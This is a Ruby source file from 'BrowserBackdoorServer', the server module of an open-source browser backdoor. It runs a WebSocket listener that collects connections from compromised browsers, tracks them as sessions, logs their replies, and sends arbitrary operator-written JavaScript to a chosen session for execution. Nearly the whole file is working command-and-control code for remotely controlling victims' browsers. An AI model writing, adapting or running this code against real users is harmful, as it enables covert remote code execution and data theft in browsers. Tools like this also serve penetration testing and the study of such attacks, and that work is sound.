#
# Copyright (c) 2016 IMcPwn  - http://imcpwn.com
# BrowserBackdoorServer by IMcPwn.
# See the file 'LICENSE' for copying permission
#

require_relative 'printcolor'
require 'em-websocket'

module Bbs

class WebSocket
    @@wsList = Array.new
    @@selected = -1
    def setSelected(newSelected)
        @@selected = newSelected
    end
    def getSelected()
        return @@selected
    end
    def getWsList()
        return @@wsList
    end
    def setWsList(newWsList)
        @@wsList = newWsList
    end
    def startEM(host, port, secure, priv_key, cert_chain, response_limit)
        EM.run {
            EM::WebSocket.run({
                :host => host,
                :port => port,
                :secure => secure,
                :tls_options => {
                    :private_key_file => priv_key,
                    :cert_chain_file => cert_chain
            }
            }) do |ws|
                ws.onopen { |handshake|
                    Bbs::PrintColor::print_notice("WebSocket connection open: " + handshake.to_s)
                    @@wsList.push(ws)
                }
                ws.onclose {
                    Bbs::PrintColor::print_error("Connection closed")
                    @@wsList.delete(ws)
                    # Reset selected error so the wrong session is not used.
                    @@selected = -2
                }
                ws.onmessage { |msg|
                    if (msg.length > response_limit)
                        begin
                            file = File.open("./bb-result-#{Time.now.to_f}.txt", "w")
                            file.write(msg)
                            Bbs::PrintColor::print_notice("Response received but is too large to display (#{msg.length} characters). Saved to #{file.path}")
                            file.close
                        rescue => e
                            Bbs::PrintColor::print_error("Error saving response to file: " + e.message)
                            Bbs::PrintColor::print_notice("Large response received (#{msg.length} characters) but could not save to file, displaying anyway: " + msg)
                        end
                    else
                        Bbs::PrintColor::print_notice("Response received: " + msg)
                    end
                }
                ws.onerror { |e|
                    Bbs::PrintColor::print_error(e.message)
                    @@wsList.delete(ws)
                    # Reset selected variable after error.
                    @@selected = -2
                }
            end
        }
    end
    
    def self.sendCommand(cmd, ws)
        command = ""\
            "setTimeout((function() {"\
            "try {"\
            "#{cmd}"\
            "}"\
            "catch(err) {"\
            "ws.send(err.message);"\
            "}"\
            "}"\
            "), 0);"
        ws.send(command)
    end

    def self.validSession?(selected, wsList)
        if selected == -2
            Bbs::PrintColor.print_error("That session has been closed.")
            return false
        elsif selected < -1
            Bbs::PrintColor.print_error("Valid sessions will never be less than -1.")
            return false
        elsif wsList.length <= selected
            Bbs::PrintColor.print_error("Session does not exist.")
            return false
        elsif wsList.length < 1
            Bbs::PrintColor.print_error("No sessions are open.")
            return false
        end
        return true
    end

end

end

